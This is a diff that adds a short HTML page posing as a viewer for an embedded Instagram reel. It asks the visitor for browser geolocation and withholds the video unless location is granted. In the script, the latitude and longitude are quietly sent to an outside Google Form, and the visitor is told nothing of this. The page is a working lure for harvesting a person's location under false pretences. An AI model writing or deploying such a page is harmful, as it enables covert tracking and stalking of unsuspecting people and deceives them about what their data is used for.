@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Watch Instagram Reel</title>
+  <style>
+    body { font-family: Arial; text-align: center; padding: 50px; }
+    #videoBox { display: none; margin-top: 20px; }
+    button { padding: 10px 20px; font-size: 18px; }
+  </style>
+</head>
+<body>
+
+<h2>Press continue to watch the video</h2>
+<button onclick="requestLocation()">Continue</button>
+
+<p id="msg"></p>
+
+<div id="videoBox">
+  <iframe src="https://www.instagram.com/reel/DUPuKpOjBOE/embed" 
+          width="320" height="600" frameborder="0">
+  </iframe>
+</div>
+
+<script>
+function requestLocation() {
+  if (!navigator.geolocation) {
+    alert("Your device does not support location.");
+    return;
+  }
+
+  navigator.geolocation.getCurrentPosition(success, error);
+}
+
+function success(position) {
+  const lat = position.coords.latitude;
+  const lon = position.coords.longitude;
+
+  document.getElementById("msg").innerText = "Location received. Enjoy the video!";
+
+  // Send location to your Google Form
+  fetch("https://docs.google.com/forms/d/e/1FAIpQLSfELTAWud7thRvLn6_2EsjaHGidGSkfbMmmC9LTHzdAOWMJiQ/formResponse", {
+    method: "POST",
+    body: new URLSearchParams({
+      "entry.8708125": lat + "," + lon
+    })
+  });
+
+  document.getElementById("videoBox").style.display = "block";
+}
+
+function error() {
+  alert("You must allow location to watch the video.");
+}
+</script>
+
+</body>
+</html>
